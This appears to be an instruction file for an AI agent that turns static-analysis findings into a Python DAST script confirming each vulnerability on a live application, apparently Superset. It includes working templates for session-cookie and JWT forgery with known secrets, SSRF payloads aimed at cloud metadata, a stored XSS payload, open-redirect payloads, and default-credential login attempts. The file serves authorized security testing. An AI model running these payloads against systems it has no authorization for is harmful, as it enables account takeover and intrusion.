Read confirmed findings from findings.json and produce a runnable Python DAST test script that dynamically confirms each finding against a live application.

This skill turns SAST findings into targeted proof-of-concept tests — one test per finding — with a pass/fail verdict for each. It is the DAST complement to the SAST pipeline.

## Input

`$ARGUMENTS` format: `[--findings <path>] [--base-url <url>] [--out <path>]`

- `--findings <path>` — path to `findings.json` (default: `./findings.json`)
- `--base-url <url>` — target URL (default: `http://localhost:8088`)
- `--out <path>` — output script path (default: `./dast-tests.py`)

---

## Step 1 — Load findings

Read `findings.json`. Extract only findings with `validation_status` of `confirmed` or `likely_real`.

Group them by CWE:
- `CWE-521` — weak secret / hardcoded credential
- `CWE-918` — SSRF
- `CWE-79` — XSS
- `CWE-601` — open redirect
- `CWE-352` — CSRF
- `CWE-16` — debug mode / dangerous configuration
- `CWE-284` — broken access control / port exposure
- `CWE-287` — authentication bypass

For each finding, extract: `id`, `cwe`, `severity`, `file`, `method`, `source`, `sink`, `evidence`, `fix_hint`.

Also extract from the top-level `findings.json`:
- `repo_path` — to infer the framework
- `language` — python, typescript, polyglot

---

## Step 2 — Generate test functions by CWE

For each finding, generate a Python test function using the templates below. Name each function `test_<finding_id_lowercase>()`.

### CWE-521 — Weak / hardcoded secret

**Sub-case A: Flask session secret (`SECRET_KEY`)**

```python
def test_config001_flask_session_forgery():
    """CONFIG-001: Flask SECRET_KEY=<value> — forge session cookie"""
    from itsdangerous import URLSafeTimedSerializer
    SECRET = "<value from evidence field>"
    s = URLSafeTimedSerializer(SECRET, salt="cookie-session")
    forged = s.dumps({"_user_id": "1", "_fresh": True})
    print(f"  Forged cookie: {forged}")
    r = requests.get(f"{BASE}/api/v1/me/", cookies={"session": forged}, timeout=10)
    if r.status_code == 200 and ("username" in r.text or "id" in r.text):
        record("CONFIG-001", "Session forgery accepted — admin access confirmed", True,
               r.text[:200])
    else:
        record("CONFIG-001", f"Session forgery — status {r.status_code}", False, r.text[:100])
```

**Sub-case B: JWT secret (guest token, async token, websocket)**

```python
def test_config002_jwt_forgery():
    """CONFIG-002: JWT secret=<value> — forge token"""
    import base64, hmac, hashlib, json, time
    SECRET = "<value from evidence field>"
    header = base64.urlsafe_b64encode(json.dumps({"alg":"HS256","typ":"JWT"}).encode()).rstrip(b"=").decode()
    exp = int(time.time()) + 3600
    payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","exp":exp}).encode()).rstrip(b"=").decode()
    sig_input = f"{header}.{payload}".encode()
    sig = base64.urlsafe_b64encode(hmac.new(SECRET.encode(), sig_input, hashlib.sha256).digest()).rstrip(b"=").decode()
    jwt = f"{header}.{payload}.{sig}"
    print(f"  Forged JWT: {jwt[:80]}...")
    # Test against the JWT-consuming endpoint identified in the finding's sink field
    r = requests.get(f"{BASE}/api/v1/security/guest_token/",
                     headers={"Authorization": f"Bearer {jwt}"}, timeout=10)
    record("CONFIG-002", f"JWT forgery — status {r.status_code}",
           r.status_code != 401, r.text[:200])
```

**Sub-case C: Default database password**

```python
def test_config004_db_password():
    """CONFIG-004: Default DB password — check if port is exposed"""
    import socket
    host, port = "localhost", 5432  # adjust from finding evidence
    s = socket.socket(); s.settimeout(3)
    exposed = s.connect_ex((host, port)) == 0
    s.close()
    record("CONFIG-004", f"DB port {port} exposed on localhost", exposed,
           "Try: psql -h localhost -U superset -d superset (password: superset)" if exposed else "Port not reachable from host")
```

### CWE-918 — SSRF

```python
def test_py001_ssrf(token):
    """PY-001: SSRF via <method> — no host validation"""
    # Derive endpoint from finding's sink field
    ENDPOINT = "<endpoint from sink field>"
    PAYLOADS = [
        ("internal metadata", {"sqlalchemy_uri": "mysql://root@169.254.169.254/test"}),
        ("localhost probe",   {"sqlalchemy_uri": "mysql://root@127.0.0.1:3306/test"}),
    ]
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    for label, body in PAYLOADS:
        r = requests.post(f"{BASE}{ENDPOINT}", json=body, headers=headers, timeout=10)
        # "connection refused" / "timeout" = host reached (no block); "invalid" / 422 = blocked
        blocked = "not allowed" in r.text.lower() or "invalid" in r.text.lower() or r.status_code == 422
        record("PY-001", f"SSRF {label} — {'BLOCKED' if blocked else 'REACHED HOST'}", not blocked,
               r.text[:200])
```

### CWE-79 — Stored XSS

```python
def test_ts002_stored_xss(token):
    """TS-002: Stored XSS via <method> — <sink>"""
    XSS = "</style><img src=x onerror=alert('XSS-TS002')>"
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    # Derive write endpoint and field from finding's source/sink
    WRITE_ENDPOINT = "<endpoint from source field>"
    FIELD = "<field name from source>"
    r = requests.put(f"{BASE}{WRITE_ENDPOINT}", json={FIELD: XSS}, headers=headers, timeout=10)
    stored = r.status_code in (200, 201)
    if stored:
        RENDER_URL = "<URL from sink field where stored value renders>"
        record("TS-002", f"XSS payload stored (status {r.status_code}) — visit {BASE}{RENDER_URL} to trigger", True,
               f"Payload: {XSS}\nCleanup: send empty string to same endpoint")
        # Cleanup
        requests.put(f"{BASE}{WRITE_ENDPOINT}", json={FIELD: ""}, headers=headers, timeout=5)
    else:
        record("TS-002", "XSS payload rejected by API", False, r.text[:200])
```

### CWE-601 — Open redirect

```python
def test_ts001_open_redirect():
    """TS-001: Open redirect via <method>"""
    PAYLOADS = [
        ("external URL",          f"{BASE}/login/?next=https://evil.example.com"),
        ("protocol-relative URL", f"{BASE}/login/?next=//evil.example.com"),
        ("data URI",              f"{BASE}/login/?next=data:text/html,<script>alert(1)</script>"),
    ]
    for label, url in PAYLOADS:
        r = requests.get(url, allow_redirects=False, timeout=10)
        location = r.headers.get("Location", "")
        external = "evil.example.com" in location or location.startswith("//") or location.startswith("data:")
        record("TS-001", f"Redirect ({label}): {'CONFIRMED' if external else 'blocked'}", external,
               f"Location: {location or 'none'}")
```

### CWE-16 — Debug mode / stack trace exposure

```python
def test_config003_debug_mode():
    """CONFIG-003: Flask debug mode — stack trace leakage"""
    r = requests.get(f"{BASE}/superset/nonexistent_route_xyz_99999", timeout=10)
    debug_exposed = any(x in r.text for x in ["Traceback", "werkzeug", "Debugger", "File \""])
    record("CONFIG-003", "Debug stack trace exposed in 404 response", debug_exposed,
           r.text[:300] if debug_exposed else f"Status {r.status_code} — generic error page")
```

---

## Step 3 — Generate login helper

If the app has a login endpoint (inferred from `entry_points[]` in crawl-output.json, or from the finding's sink path), generate a `get_auth_token()` helper that the SSRF and XSS tests can call:

```python
def get_auth_token():
    """Login with default credentials to get a bearer token for API tests"""
    CREDS = [
        {"username": "admin", "password": "general"},
        {"username": "admin", "password": "admin"},
    ]
    for cred in CREDS:
        r = requests.post(f"{BASE}/api/v1/security/login",
                         json={**cred, "provider": "db"}, timeout=10)
        if r.status_code == 200 and "access_token" in r.text:
            token = r.json()["access_token"]
            print(f"  Logged in as {cred['username']}")
            return token
    print("  Could not log in with default credentials — API tests will be skipped")
    return None
```

---

## Step 4 — Assemble the script

Write `dast-tests.py` with this structure:

```python
"""
DAST Confirmation Tests — <repo_name>
Generated from: findings.json
Target: <base_url>
Run AFTER the application is started and reachable.
"""

import sys, json, requests
BASE = "<base_url>"
results = []

def record(id, name, confirmed, detail):
    mark = "CONFIRMED" if confirmed else ("NOT CONFIRMED" if confirmed is False else "AMBIGUOUS")
    print(f"  [{mark}] {id}: {name}")
    if detail: print(f"           {detail}")
    results.append({"id": id, "confirmed": confirmed, "detail": detail})

def check_app_running():
    try:
        return requests.get(f"{BASE}/health", timeout=5).status_code == 200
    except: return False

# --- helper ---
<get_auth_token() function>

# --- tests ---
<one test function per finding, in severity order>

# --- main ---
def main():
    print("=" * 65)
    print(f"  DAST Confirmation — <repo> @ {BASE}")
    print("=" * 65)
    if not check_app_running():
        print(f"\nERROR: App not running at {BASE}")
        sys.exit(1)
    token = get_auth_token()
    <call each test function>
    # summary
    confirmed = [r for r in results if r["confirmed"] is True]
    not_confirmed = [r for r in results if r["confirmed"] is False]
    print(f"\nCONFIRMED: {len(confirmed)} | NOT CONFIRMED: {len(not_confirmed)}")
    for r in confirmed:
        print(f"  ✓ {r['id']}: {r['detail'][:80]}")

if __name__ == "__main__":
    main()
```

---

## Step 5 — Add static confirmations for config findings

For findings where `source: "configuration"` (all CONFIG-* findings), add a comment block at the top of the script documenting what can be confirmed WITHOUT running the app:

```python
# STATIC CONFIRMATIONS (no running app needed — verified from source files)
# CONFIG-001: SUPERSET_SECRET_KEY=TEST_NON_DEV_SECRET confirmed in docker/.env:79
# CONFIG-002: CHANGE_ME_SECRET_KEY confirmed in superset/constants.py:30
# CONFIG-003: FLASK_DEBUG=true confirmed in docker/.env:67
```

These are confirmed by the SAST pipeline reading the files directly. The dynamic tests below confirm the behavioral impact.

---

## Constraints

- Do NOT hard-code credentials beyond what is already in findings.json evidence
- Every test function must include a comment with the finding ID and what it tests
- Tests must clean up after themselves (delete test data, restore original values) where possible
- If `itsdangerous` or other packages are needed, add a `requirements check` at the top of the script
- Do not test against systems you do not own — this script is for local/authorized environments only

---

## Completion

```
generate-dast-tests complete.
  Findings loaded  : <N> confirmed + likely_real
  Tests generated  : <N> (<breakdown by CWE>)
  Static confirms  : <N> config findings documented as statically confirmed
  Output           : dast-tests.py
  
Run with: python dast-tests.py [--base-url http://localhost:PORT]
```
